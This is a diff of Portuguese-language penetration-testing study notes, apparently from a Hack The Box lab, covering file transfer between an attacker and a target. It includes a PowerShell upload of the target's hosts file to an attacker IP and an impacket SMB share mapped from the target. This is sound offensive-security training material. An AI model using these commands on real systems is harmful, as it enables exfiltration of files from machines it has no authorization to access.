@@ -187,3 +187,23 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
 [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
 ```
+
+### Impackt Uploads (melhor)
+
+na maquina do atacante (tem que ser no path do arquivo)
+
+```
+impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+na maquina alvo
+
+```
+net use Z: \\IP-atacante\share
+```
